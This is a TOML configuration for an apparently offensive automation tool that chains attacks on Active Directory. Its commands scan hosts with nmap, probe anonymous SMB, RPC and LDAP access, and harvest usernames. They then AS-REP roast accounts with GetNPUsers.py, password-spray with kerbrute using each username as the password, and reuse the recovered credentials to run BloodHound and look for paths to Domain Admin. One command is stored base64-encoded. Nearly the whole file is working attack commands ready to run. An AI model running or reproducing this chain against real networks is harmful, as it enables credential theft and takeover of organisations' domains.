[nmap]
name = "nmap"
cmd = "nmap -v -Pn {ip}"

  [[nmap.patterns]]
  "Discovered open port (445|139)" = [
    "SMB SERVICE FOUND",
    "RPC SERVICE FOUND"
  ]

  [[nmap.patterns]]
  "Discovered open port (389)" = [
    "LDAP SERVICE FOUND"
  ]

[smbclient-anonymous]
name = "smbclient-anonymous"
cmd = "smbclient -U ''%'' \\\\\\\\{ip}\\\\IPC$ -c 'AZERTY;q'"

  [[smbclient-anonymous.patterns]]
  "AZERTY: command not found" = [
    "SMB ANONYMOUS ACCESS ALLOWED"
  ]

[ldap-base]
name = "ldap-base"
cmd = "ldapsearch -LLL -x -h {ip} -s base"

  [[ldap-base.store]]
  domain_name = "ldapServiceName: .*\\@(.*)$"

  [[ldap-base.store]]
  dc_dns = "dnsHostName: (.*?)$"

  [[ldap-base.store]]
  domain_dn = "rootDomainNamingContext: (.*?)$"

  [[ldap-base.patterns]]
  "rootDomainNamingContext: DC=.*$" = [
    "TARGET IS A DOMAIN CONTROLLER"
  ]

[ldap-anonymous-dc]
name = "ldap-anonymous-dc"
cmd = """
ldapsearch -LLL -x -h {ip} -b '{domain_dn}' > {output_dir}ldap-anonymous-dc.txt;
result=$(find {output_dir}ldap-anonymous-dc.txt -size +5);
if [ ! -z $result ]
then
    echo "SUCCESS";
fi"""

  [[ldap-anonymous-dc.store_static]]
  ldap_dc_output_file = "{output_dir}ldap-anonymous-dc.txt"

  [[ldap-anonymous-dc.patterns]]
  "SUCCESS" = [
    "LDAP ANONYMOUS ACCESS TO DC"
  ]

[extract-ldap-users]
name = "extract-ldap-users"
cmd = """
cat {output_dir}ldap-anonymous-dc.txt \
| grep -A 30 "objectClass: user" \
| grep "sAMAccountName:" \
| cut -d" " -f2 \
| tr '[a-z]' '[A-Z]' > {output_dir}ldap_users.lst;
cat {output_dir}ldap_users.lst;
[ -s {output_dir}ldap_users.lst ] \
&& echo '###USERS FOUND'"""

  [[extract-ldap-users.append_array]]
  usernames = "^((?!###USERS).*)$" 
  
  [[extract-ldap-users.patterns]]
  "USERS FOUND" = [
    "VALID USERNAME FOUND"
  ]

[rpc-anonymous]
name = "rpc-anonymous"
cmd = "rpcclient -U ''%'' {ip} -c 'AZERTY;quit' 2>/dev/null"

  [[rpc-anonymous.patterns]]
  "command not found: AZERTY" = [
    "RPC ANONYMOUS ACCESS ALLOWED"
  ]

[rpc-list-users]
name = "rpc-list-users"
cmd = """rpcclient -U ''%'' {ip} -c 'enumdomusers;quit' 2>/dev/null \
| cut -d[ -f2 \
| cut -d] -f1 \
| tr '[a-z]' '[A-Z]' > {output_dir}rpc_users.lst;
cat {output_dir}rpc_users.lst;
[ -s {output_dir}rpc_users.lst ] \
&& grep -vq 'result was' {output_dir}rpc_users.lst \
&& echo 'USERS FOUND'"""

  [[rpc-list-users.append_array]]
  usernames = "^(?!USERS FOUND|RESULT WAS NT_STATUS_ACCESS_DENIED)(.*)$" 

  [[rpc-list-users.patterns]]
  "USERS FOUND" = [
    "VALID USERNAME FOUND"
  ]

[asreproast]
name = "asreproast"
cmd = """
lockfile-create --lock-name {output_dir}asreproast.lock;
python3 -c "a={usernames}; print('\\n'.join(x.split('@')[0] for x in a))" > {output_dir}asrep_users.tmp \
&& sort -u {output_dir}asrep_users.tmp -f {output_dir}asrep_users.tmp;
if [ -s {output_dir}asrep_users_validated.tmp ]; then \
diff {output_dir}asrep_users.tmp {output_dir}asrep_users_validated.tmp \
| grep "<" | sed -e 's/< //' > {output_dir}asrep_users_to_validate.tmp;
else
touch {output_dir}asrep_users_validated.tmp;
mv {output_dir}asrep_users.tmp {output_dir}asrep_users_to_validate.tmp; 
fi
cat {output_dir}asrep_users_to_validate.tmp >> {output_dir}asrep_users_validated.tmp;
GetNPUsers.py {domain_name}/ -usersfile {output_dir}asrep_users_to_validate.tmp -no-pass -dc-ip {ip} -outputfile {output_dir}asreproast.hash; 
lockfile-remove --lock-name {output_dir}asreproast.lock;
[ -s {output_dir}asreproast.hash ] && echo 'TGT FOUND'"""

  [[asreproast.store_static]]
  asreproast_hashes = "{output_dir}asreproast.hash"

  [[asreproast.patterns]]
  "TGT FOUND" = [
    "TGT HASH FOUND"
  ]

[extract-links-html]
name = "extract-links-html"
cmd =  "Y3VybCAtcyAtTCAtayB7dXJsfSBcCnwgZ3JlcCAtRXdobyAiKHNyY3xocmVmKVsnXCJdP1xzKls9Ol1ccypbJ1wiXT9bXidcIj4gXSoiIFwKfCBhd2sgJ3t7c3BsaXQoJDAsYXJyLC8oaHJlZnxzcmMpWz06XVtcIicnXT8vKTsgcHJpbnQgYXJyWzJdfX0nIFwKfCBzb3J0IC1mdSBcCnwgZ3JlcCAtRXYgIlwuKHBuZ3xzdmd8anBnfGpwZWd8Y3NzKSIgXAp8IHNvcnQgLWZ1ID4ge291dHB1dF9kaXJ9dG1wX3VybHMubHN0OyBcCndoaWxlIHJlYWQgLXIgbGluZTsgZG8gXAppZiBbWyAhICRsaW5lID1+IGh0dHAocyk/Oi8vIF1dOyB0aGVuIFwKcHl0aG9uMyAtYyAiZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHVybGpvaW47IHRyeTogcHJpbnQodXJsam9pbigne3VybH0nLCAnJGxpbmUnKSk7IGV4Y2VwdDogcGFzczsiO1wKZWxzZSBcCmVjaG8gJGxpbmU7CmZpO1wKZG9uZSA8IHtvdXRwdXRfZGlyfXRtcF91cmxzLmxzdCA+PiB7b3V0cHV0X2Rpcn11cmxzLmxzdDsgXApbIC1zIHtvdXRwdXRfZGlyfXVybHMubHN0IF0gJiYgZWNobyAiVVJMUyBGT1VORCI="
base64 = true

  [[extract-links-html.store_static]]
  urls_file = "{output_dir}urls.lst"

  [[extract-links-html.patterns]]
  "URLS FOUND" = [
    "RECON_JS_FILES"
  ]

[recon-js-files]
name = "recon-js-files"
cmd = "python3 ~/programs/reconjs/reconjs.py -r -d {output_dir}reconjs -u {url}"

  [[recon-js-files.append_array]]
  "map_file_paths" = "Map file saved at (.*?)$"
  
  [[recon-js-files.patterns]]
  "Map file saved" = [
    "JS_MAP_FILE_FOUND"
  ]
  "Unminified file found !" = [
    "JS_UNMINIFIED_FILE_FOUND"
  ]

[unsourcemap]
name = "unsourcemap"
cmd = '''mkdir -p {output_dir}unsourcemap && outfile_name=`echo "{array_element}" | awk -F/ '{{ print $NF }}' | cut -d. -f1` && python3 /home/layno/programs/reconjs/unwebpack_sourcemap.py --make-directory --local {array_element} {output_dir}unsourcemap/$outfile_name/'''
iterate_over = "map_file_paths"

[kerbrute-userenum]
name = "kerbrute-userenum"
cmd = """~/programs/kerbrute/kerbrute userenum --dc {ip} -d {domain_name} {potential_usernames_file}"""

  [[kerbrute-userenum.append_array]]
  "usernames" = '''\[\+\] VALID USERNAME:\s*(.*)\x1b'''

  [[kerbrute-userenum.patterns]]
  "VALID USERNAME" = [
    "VALID USERNAME FOUND"
  ]

[kerbrute-test-user-as-pass]
name = "kerbrute-test-user-as-pass"
cmd = """lockfile-create --lock-name {output_dir}kerbrute.lock;
python3 -c "a={usernames}; print('\\n'.join(a))" > {output_dir}usernames.tmp \
&& sort -u {output_dir}usernames.tmp -f {output_dir}usernames.tmp;
if [ -s {output_dir}usernames_validated.tmp ]; then \
diff {output_dir}usernames.tmp {output_dir}usernames_validated.tmp \
| grep "<" | sed -e 's/< //' > {output_dir}usernames_to_validate.tmp;
else
touch {output_dir}usernames_validated.tmp;
mv {output_dir}usernames.tmp {output_dir}usernames_to_validate.tmp; 
fi
cat {output_dir}usernames_to_validate.tmp >> {output_dir}usernames_validated.tmp;
~/programs/kerbrute/kerbrute passwordspray --user-as-pass --dc {ip} -d {domain_name} {output_dir}usernames_to_validate.tmp;
lockfile-remove --lock-name {output_dir}kerbrute.lock;"""

  [[kerbrute-test-user-as-pass.append_array]]
  "credentials" = '''\[\+\] VALID LOGIN:\s*(.*)\x1b'''

  [[kerbrute-test-user-as-pass.patterns]]
  "VALID LOGIN" = [
    "VALID CREDENTIALS FOUND"
  ]

[first-valid-creds]
name = "first-valid-creds"
cmd = '''python3 -c "a={credentials}; u,p=a[0].split(':'); print(f'USERNAME: {{u}}'); print(f'PASSWORD: {{p}}')";'''

  [[first-valid-creds.store]]
  user_default = '''^USERNAME: (.*?)$'''

  [[first-valid-creds.store]]
  password_default = '''^PASSWORD: (.*?)$'''

[bloodhound-gather-info]
name = "bloodhound-gather-info"
cmd = "cd {output_dir}; mkdir -p bloodhound; cd bloodhound; bloodhound-python -u {user_default} -p {password_default} -d {domain_name} -dc {dc_dns} -ns {ip} -c all"
run_once = true

  [[bloodhound-gather-info.store]]
  bloodhound_gathered = "INFO: Done"

  [[bloodhound-gather-info.patterns]]
  "INFO: Done" = [
    "BLOODHOUND GATHERED"
  ]

[bloodhound-add-owned-users]
name = "bloodhound-add-owned-users"
cmd = """python3 -c "a={credentials}; print('\\n'.join(a))" | cut -d'@' -f1  > {output_dir}owned_users.lst \
&& sort -u {output_dir}owned_users.lst -f {output_dir}owned_users.lst;
python3 ~/programs/bloodhound/mark_as_owned.py -l {output_dir}owned_users.lst -d {domain_name};"""
iterate_over = "credentials"

  [[bloodhound-add-owned-users.patterns]]
  "Done$" = [
    "OWNED USERS ADDED"
  ]

[kerberoast]
name = "kerberoast"
cmd = ""

  [[kerberoast.patterns]]
  "" = [
    "TGS HASH FOUND"
  ]

[bloodhound-check-shortest-path]
name = "bloodhound-check-shortest-path"
cmd = "python3 ~/programs/bloodhound/check_path_to_da.py -u $(echo '{array_element}' | cut -d':' -f1)"
iterate_over = "credentials"

  [[bloodhound-check-shortest-path.patterns]]
  "\[\+\] Path to DA found for user " = [
    "PATH TO DA FOUND"
  ]

[manual-user-add]
name = "manual-user-add"
file = "{output_dir}credentials.lst"
listener = true

  [[manual-user-add.append_array]]
  "credentials" = '(.*)'

  [[manual-user-add.patterns]]
  "(.*)" = [
    "VALID CREDENTIALS FOUND"
  ]
